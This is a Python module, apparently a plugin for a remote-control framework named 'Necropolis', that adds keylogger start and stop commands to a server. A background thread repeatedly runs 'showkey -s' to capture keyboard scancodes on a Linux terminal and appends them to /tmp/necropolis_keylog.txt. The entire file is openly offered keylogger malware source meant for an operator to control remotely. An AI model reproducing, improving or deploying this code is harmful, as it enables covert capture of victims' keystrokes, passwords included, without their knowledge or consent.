import threading
import subprocess

log_file = "/tmp/necropolis_keylog.txt"
keylogger_thread_obj = None
running = False

def start_keylogger(server, args):
    global keylogger_thread_obj, running
    if running:
        print("[Keylogger] Ya está corriendo.")
        return
    running = True
    print("[Keylogger] Iniciando keylogger...")
    keylogger_thread_obj = threading.Thread(target=keylogger_loop, daemon=True)
    keylogger_thread_obj.start()

def stop_keylogger(server, args):
    global running
    if not running:
        print("[Keylogger] No está corriendo.")
        return
    running = False
    print("[Keylogger] Deteniendo keylogger...")

def keylogger_loop():
    global running
    with open(log_file, "a") as f:
        while running:
            try:
                proc = subprocess.Popen(["showkey", "-s"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, _ = proc.communicate(timeout=1)
                if stdout:
                    f.write(stdout.decode(errors='ignore'))
                    f.flush()
            except subprocess.TimeoutExpired:
                proc.kill()
            except Exception as e:
                f.write(f"[Keylogger Error] {e}\n")
                f.flush()

def register(server):
    server.register_command("keylogger_start", start_keylogger, "Inicia keylogger (Linux tty)")
    server.register_command("keylogger_stop", stop_keylogger, "Detiene keylogger")

